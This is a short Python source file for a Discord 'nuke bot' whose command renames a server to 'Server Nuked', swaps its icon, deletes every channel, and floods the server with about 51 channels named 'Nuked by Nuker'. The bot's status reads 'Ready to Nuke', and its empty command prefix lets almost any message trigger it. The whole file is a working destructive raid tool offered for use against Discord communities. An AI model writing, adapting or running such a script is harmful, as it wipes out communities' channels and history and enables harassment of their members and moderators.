
#import
import discord,os,asyncio
from discord.ext import commands, tasks


#set prefix
prefix=''


client = commands.Bot(command_prefix=prefix)


#set status and print connect message
@client.event
async def on_ready():
	print("Bot Logged In!")
	await client.change_presence(activity=discord.Game(name="Ready to Nuke"))


#open 'icon.png' as icon
with open ('icon.png','rb') as f:
	icon = f.read()




@client.command()
async def  nuke(ctx):

	await ctx.guild.edit(name='Server Nuked', icon=icon) #change guild icon and name

	for c in ctx.guild.channels : #go through all channels
		await c.delete() #delete all channels

  
	guild = ctx.message.guild #get guild

  
  #create a while loop
	n = 0
	while(n<=50):
		await guild.create_text_channel('Nuked by Nuker') #create text channels
		n = n + 1

	




TOKEN = '{your_token}'
client.run(TOKEN)
"# nuke-bot" 
